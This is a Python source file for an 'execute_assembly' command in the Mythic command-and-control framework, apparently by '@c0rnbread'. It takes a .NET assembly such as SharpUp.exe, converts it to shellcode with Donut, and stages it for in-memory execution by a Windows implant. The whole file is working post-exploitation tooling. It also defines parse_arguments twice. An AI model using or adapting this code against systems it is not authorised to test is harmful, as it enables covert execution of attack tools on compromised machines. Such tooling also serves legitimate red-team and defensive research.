from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..utils.packer import serialize_int, serialize_bool, serialize_string
import logging, sys
import os
import tempfile
import donut

logging.basicConfig(level=logging.INFO)


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Already existing .NET assembly to execute (e.g. SharpUp.exe)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
            CommandParameter(
                name="assembly_file",
                display_name="New Assembly",
                type=ParameterType.File,
                description="A new .NET assembly to execute. After uploading once, you can just supply the -Assembly parameter",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="New Assembly", 
                        ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=2
                    ),
                ],
            ),
            
            
            # TODO - Add arguments for x64/x86, Method name (optional), Class name (optional)
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=True,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    ExecuteAssemblyCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])

def print_attributes(obj):
    for attr in dir(obj):
        if not attr.startswith("__"):  # Ignore built-in dunder methods
            try:
                logging.info(f"{attr}: {getattr(obj, attr)}")
            except Exception as e:
                logging.info(f"{attr}: [Error retrieving attribute] {e}")

class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly -File [Assmbly Filename] [-Arguments [optional arguments]]"
    description = "Execute a .NET Assembly. Use an already uploaded assembly file or upload one with the command. (e.g., execute_assembly -File SharpUp.exe -Arguments \"audit\")"
    version = 1
    author = "@c0rnbread"
    attackmapping = []
    argument_class = ExecuteAssemblyArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[ SupportedOS.Windows ],
        suggested_command=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            ######################################
            #                                    #
            #   Group (New Assembly | Default)   #
            #                                    #
            ######################################
            groupName = taskData.args.get_parameter_group_name()
            
            if groupName == "New Assembly":
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    AgentFileID=taskData.args.get_arg("assembly_file")
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        pass
                    else:
                        raise Exception("Failed to find that file")
                else:
                    raise Exception("Error from Mythic trying to get file: " + str(file_resp.Error))
                
                # Set display parameters
                response.DisplayParams = "-Assembly {} -Arguments {}".format(
                    file_resp.Files[0].Filename,
                    taskData.args.get_arg("assembly_arguments")
                )
                
                taskData.args.add_arg("assembly_name", file_resp.Files[0].Filename)
                taskData.args.remove_arg("assembly_file")
            
            elif groupName == "Default":
                # We're trying to find an already existing file and use that
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename=taskData.args.get_arg("assembly_name"),
                    LimitByCallback=True,                                # TODO TEST THIS
                    MaxResults=1
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        logging.info(f"Found existing Assembly with File ID : {file_resp.Files[0].AgentFileId}")

                        taskData.args.remove_arg("assembly_name")    # Don't need this anymore
                        
                        # Set display parameters
                        response.DisplayParams = "-Assembly {} -Arguments {}".format(
                            file_resp.Files[0].Filename,
                            taskData.args.get_arg("assembly_arguments")
                        )

                    elif len(file_resp.Files) == 0:
                        raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
                else:
                    raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))

            ######################################
            #                                    #
            #      Convert the .NET Assembly     #
            #      to Shellcode with Donut       #
            #                                    #
            ######################################
            # await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(     # BUG - This prevents the command from getting sent to the Agent
            #     TaskID=taskData.Task.ID,
            #     UpdateStatus=f"Converting .NET Assembly to Shellcode"
            # ))
            
            # Get the file contents of the .NET assembly
            assembly_contents = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=file_resp.Files[0].AgentFileId)
            )

            # Need a physical path for donut.create()
            fd, temppath = tempfile.mkstemp(suffix='.exe')
            logging.info(f"Writing Assembly Contents to temporary file \"{temppath}\"")
            with os.fdopen(fd, 'wb') as tmp:
                # logging.info(f"ASSEMBLY CONTENTS: {assembly_contents.Content}")
                tmp.write(assembly_contents.Content)

            # Bypass=None, ExitOption=exit process
            assembly_shellcode = donut.create(file=temppath, params=taskData.args.get_arg("assembly_arguments"), bypass=1, exit_opt=2)
            # Clean up temp file
            os.remove(temppath)
            
            logging.info(f"Converted .NET into Shellcode {len(assembly_shellcode)} bytes")
            
            # .NET shellcode stub in Mythic
            shellcode_file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(TaskID=taskData.Task.ID, FileContents=assembly_shellcode, DeleteAfterFetch=True)
            )
            
            if shellcode_file_resp.Success:
                taskData.args.add_arg("assembly_shellcode_id", shellcode_file_resp.AgentFileId)
                
                # Don't actually need to send any of these to the Agent
                taskData.args.remove_arg("assembly_file")
                taskData.args.remove_arg("assembly_name")
                taskData.args.remove_arg("assembly_arguments")
            else:
                raise Exception("Failed to register execute_assembly binary: " + shellcode_file_resp.Error)
            
            # Debugging
            logging.info(taskData.args.to_json())
            
            return response

        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp